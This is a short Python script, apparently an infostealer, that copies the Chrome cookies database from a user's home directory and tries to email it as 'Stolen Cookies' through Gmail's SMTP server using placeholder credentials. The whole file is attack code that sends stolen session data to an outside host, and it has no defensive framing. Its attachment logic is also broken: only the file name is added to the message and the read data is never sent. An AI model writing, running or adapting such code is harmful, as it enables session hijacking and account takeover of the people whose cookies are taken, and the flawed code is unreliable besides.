import smtplib
import shutil
import os

# Path to the Chrome cookies file
cookie_path = os.path.expanduser('~/.config/google-chrome/Default/Cookies')

# Destination path to save the stolen cookies
destination_path = 'stolen_cookies.db'

# Copy the cookies file to the destination path
shutil.copy(cookie_path, destination_path)

# Gmail account details
sender_email = 'your_email@gmail.com'
sender_password = 'your_password'
receiver_email = 'recipient_email@gmail.com'

# Send the stolen cookies as an email attachment
try:
    with open(destination_path, 'rb') as file:
        file_data = file.read()

    # SMTP setup
    smtp_server = "smtp.gmail.com"
    smtp_port = 587
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    server.login(sender_email, sender_password)

    # Email content
    email_subject = 'Stolen Cookies'
    email_body = 'Please find the stolen cookies attached.'
    email_attachment_name = 'stolen_cookies.db'

    # Create the email message
    message = f"Subject: {email_subject}\n\n{email_body}"
    message_with_attachment = f"Subject: {email_subject}\n\n{email_body}"
    message_with_attachment += f"\n\nAttachment: {email_attachment_name}"

    # Send the email with attachment
    server.sendmail(sender_email, receiver_email, message_with_attachment)
    server.quit()

    # Success message
    print("Stolen cookies sent successfully!")
except Exception as e:
    # Error message
    print(f"An error occurred while sending the stolen cookies: {str(e)}")